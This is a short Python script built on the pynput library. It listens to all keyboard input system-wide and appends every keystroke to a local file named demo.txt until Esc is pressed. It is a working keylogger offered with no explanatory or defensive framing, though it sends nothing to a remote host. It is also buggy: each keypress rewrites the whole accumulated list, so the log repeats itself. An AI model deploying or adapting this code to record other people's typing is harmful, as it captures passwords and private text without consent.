from pynput.keyboard import Key, Listener

k = []
# we welcome you


def on_press(key):
    k.append(key)
    write_1(k)


def write_1(va):
    with open("demo.txt", "a") as f:
        for i in va:
            new_var = str(i).replace("'", "")
            f.write(new_var)
            f.write(" ")
    pass


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
